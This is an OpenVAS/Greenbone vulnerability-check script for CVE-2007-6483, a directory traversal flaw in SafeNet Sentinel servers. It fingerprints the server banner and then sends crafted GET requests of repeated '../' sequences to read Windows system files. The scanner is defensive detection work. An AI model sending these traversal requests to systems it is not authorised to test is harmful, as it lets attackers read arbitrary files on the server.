# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105028");
  script_cve_id("CVE-2007-6483");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_version("2025-04-15T05:54:49+0000");
  script_name("SafeNet Sentinel Protection Server and Sentinel Keys Server Directory Traversal");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33428/");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-05-20 12:17:04 +0200 (Tue, 20 May 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 7002);
  script_mandatory_keys("SentinelKeysServer/banner");

  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary files
within the context of the web server. Information harvested may aid in
launching further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"SafeNet Sentinel Protection Server and Sentinel Keys Server are prone
to a directory traversal vulnerability because they fail to sufficiently sanitize
user-supplied input.");

  script_tag(name:"affected", value:"SafeNet Sentinel Protection Server 7.0.0 through 7.4.0 and Sentinel Keys
Server 1.0.3 and 1.0.4");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port( default:7002 );

banner = http_get_remote_headers( port:port );
if( "Server: Sentinel" >!< banner ) exit( 0 );

files = traversal_files( 'windows' );

foreach file( keys( files ) )
{
  url = '/' + crap( data:"../", length:6*9 ) + files[file];
  if( http_vuln_check( port:port, url:url, pattern:file ) )
  {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
